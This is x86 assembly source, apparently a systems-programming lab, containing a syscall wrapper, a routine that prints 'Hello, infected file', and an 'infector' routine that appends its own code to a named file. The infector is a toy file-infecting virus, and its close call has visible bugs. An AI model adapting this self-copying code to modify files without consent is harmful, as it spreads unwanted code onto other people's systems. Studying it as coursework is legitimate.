section .data
    infected_message: db 'Hello, infected file', 0xA
    infected_message_len: equ $ - infected_message
    file_descriptor: db 0

section .text
    global _start
    global system_call
    global infection
    global infector
    global code_start
    global code_end
    extern main


_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
    
code_start:
    infection:
        push ebp                        ; save caller state
        pushad                          ; save more caller state
        mov eax, 4                      ; system call write
        mov ebx, 1                      ; file descriptor (stdout)
        mov ecx, infected_message       ; message to write
        mov edx, infected_message_len   ; message length
        int 0x80                        ; call kernel
        popad                           ; Restore caller state
        pop ebp                         ; Restore callelr state
        ret                             ; back to caller

    infector:

        push    ebp                     ; Save caller state
        mov     ebp, esp
        sub     esp, 4                  ; Leave space for local var on stack
        pushad                          ; Save some more caller state
            
        ;open file for append
        mov eax, 5                      ; system call open file 
        mov ebx, [ebp+8]                ; copy function arg to register (filepath)
        mov ecx, 1025                   ; file access (append)
        mov edx, 0777                   ; file permissions (read/write and execute by all)
        int 0x80                        ; call kernel
        mov [file_descriptor], eax      ; Save returned value into variable
        
        ;write to file
        mov eax, 4                      ; system call write 
        mov ebx, [file_descriptor]      ; copy returned value to register (file description)
        mov ecx, code_start             ; pointer to buffer
        mov edx, code_end-code_start    ; bytes to read
        int 0x80                        ; call kernel
        mov [ebp-4], eax                ; Save returned value...
            
        ;close file
        mov eax, 6                      ; system call close 
        mov ebx, file_descriptor        ; copy returned value to register (file description)
        int 0x80                        ; call kernel
        mov [ebp-4], eax                ; Save returned value...
        
        popad                           ; Restore caller state (registers)
        mov     eax, [ebp-4]            ; place returned value where caller can see it
        add     esp, 4                  ; Restore caller state  
        pop     ebp                     ; Restore caller state
        ret                             ; Back to caller
    code_end:    
